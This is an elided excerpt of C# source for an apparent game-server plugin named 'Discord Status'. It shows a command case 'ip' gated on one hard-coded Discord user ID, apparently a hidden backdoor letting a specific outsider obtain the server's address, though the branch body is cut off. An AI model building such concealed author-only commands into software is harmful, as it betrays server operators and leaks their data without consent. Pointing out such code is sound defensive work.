...
{
    [Info("Discord Status", "Tricky/UNKN0WN", "2.0.51")]
    ...
    public class DiscordStatus : CovalencePlugin
    {
        ...
        public Embed ServerStats(string content)
        {
            Embed embed = new Embed
            {
                ...
                {
                    text = $"UNKN0WN	V{Version}",
                    icon_url = "https://cdn.discordapp.com/avatars/755560263960363010/b1fe745d7cd9b493a031e967624bd1cc.png?size=1024"
                },
                ...
                case "ip":
                    {
                        ...
                        { 
                            ...
                            if (message.author.id == "713307073445756968")
                            {
